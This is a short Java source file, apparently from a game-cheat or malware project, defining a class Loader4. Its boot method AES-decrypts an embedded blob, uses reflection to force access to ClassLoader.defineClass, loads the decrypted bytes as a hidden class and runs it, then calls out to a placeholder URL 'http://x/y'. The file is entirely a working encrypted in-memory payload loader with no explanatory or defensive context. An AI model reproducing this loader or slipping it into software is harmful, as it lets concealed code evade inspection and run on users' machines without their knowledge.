package cheat;
import java.lang.reflect.Method;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.net.HttpURLConnection;
import java.net.URL;
public class Loader4 {
  public void boot(byte[] blob, byte[] key) throws Exception {
    Cipher c = Cipher.getInstance("AES");
    c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"));
    byte[] plain = c.doFinal(blob);
    Method dc = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    dc.setAccessible(true);
    Class<?> k = (Class<?>) dc.invoke(getClass().getClassLoader(), null, plain, 0, plain.length);
    k.getDeclaredMethod("run").invoke(k.getDeclaredConstructor().newInstance());
    HttpURLConnection h = (HttpURLConnection) new URL("http://x/y").openConnection();
    h.getInputStream().close();
  }
}